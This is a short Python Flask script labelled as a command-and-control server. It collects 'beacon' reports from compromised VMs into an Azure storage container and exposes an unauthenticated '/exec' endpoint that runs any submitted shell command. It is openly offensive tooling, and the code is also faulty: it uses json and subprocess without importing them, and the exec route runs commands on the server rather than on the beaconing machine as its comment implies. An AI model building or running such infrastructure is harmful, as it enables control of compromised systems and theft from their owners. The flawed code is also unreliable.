# c2_server.py - Simple HTTPS beacon collector
from flask import Flask, request
import azure.storage.blob as blob

app = Flask(__name__)

@app.route('/beacon', methods=['POST'])
def beacon():
    data = request.json
    # Store in Azure Blob for persistence
    blob_client = blob.BlobClient.from_connection_string(conn_str="your_storage_conn", container_name="c2", blob_name=f"beacon-{data['vm']}.json")
    blob_client.upload_blob(json.dumps(data), overwrite=True)
    return "OK", 200

@app.route('/exec', methods=['POST'])
def exec_cmd():
    vm = request.args.get('vm')
    cmd = request.form['cmd']  # From beacon response
    # Queue for operator
    return f"output: {subprocess.getoutput(cmd)}"

if __name__ == '__main__':
    app.run(ssl_context='adhoc', host='0.0.0.0', port=443)
